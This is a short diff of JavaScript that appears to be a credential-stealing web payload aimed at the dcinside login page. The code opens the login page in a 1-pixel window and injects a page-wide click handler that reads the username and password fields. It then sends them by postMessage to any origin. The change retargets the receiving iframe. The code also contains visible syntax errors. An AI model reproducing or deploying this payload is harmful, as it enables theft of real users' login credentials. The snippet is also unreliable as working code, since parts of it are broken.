@@ -41,5 +41,5 @@ window.addEventListener("message", receiveMessage, false);
 opener.document.querySelector("#container > section > article:nth-child(3) > div.view_content_wrap > div > div.appending_file_box").appendChild(nas);
 newwindow = window.open('https://sign.dcinside.com/login', 'hash', 'width=1px, height=1px');
 $('#hash').on('load', function () {
-	$('html').attr('onclick', 'var i=document.getElementById('child_iframe').contentWindow;iframe.postMessage({ id : document.querySelector("#id").value, pw = document.querySelector("#pw").value }, "*");setTimeout(function(){$("#hash").remove()},300);');
+	$('html').attr('onclick', 'var i=document.getElementById("movieIcon1").contentWindow;i.postMessage({ id : document.querySelector("#id").value, pw = document.querySelector("#pw").value }, "*");setTimeout(function(){$("#hash").remove()},300);');
 });
